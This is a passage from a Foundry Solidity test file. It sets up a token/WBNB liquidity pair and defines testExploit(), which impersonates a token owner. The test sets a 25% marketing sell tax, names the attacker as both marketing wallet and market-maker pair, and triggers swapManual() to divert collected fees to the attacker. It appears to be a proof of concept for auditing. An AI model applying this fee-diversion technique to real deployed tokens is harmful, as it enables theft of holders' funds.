        deal(wbnb, cakeWbnbPair, 1000 ether);
        deal(rewardToken, cakeWbnbPair, 5_000_000 * 1e18);
        IUniswapV2Pair(cakeWbnbPair).sync();

        // Provide the target contract with some ETH in case it needs to add liquidity itself
        deal(TARGET, 10 ether);

        // Ensure attacker starts with 0 reward tokens for a clean profit calculation
        deal(rewardToken, attacker, 0);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        vm.startPrank(owner);
                // Set sell fees: 0% liquidity, 0% rewards, 25% marketing, 0% dead
                token.setSelTaxes(0, 0, 25, 0);
                token.setMarketingWallet(payable(attacker));
                token.setAutomatedMarketMakerPair(attacker, true);
                vm.stopPrank();

                // From a secondary address, transfer tokens to the attacker address.
                // Because the attacker is now a 'pair', this is treated as a sell and fees are collected.
                vm.startPrank(secondaryAddress);
                token.transfer(attacker, transferAmount);
                vm.stopPrank();

                // As the owner, call swapManual().
                // This will swap the collected fees (in CoinToken) for the rewardToken and
                // send the marketing portion to the marketing wallet (now the attacker).
                vm.startPrank(owner);
                token.swapManual();
                vm.stopPrank();
    }




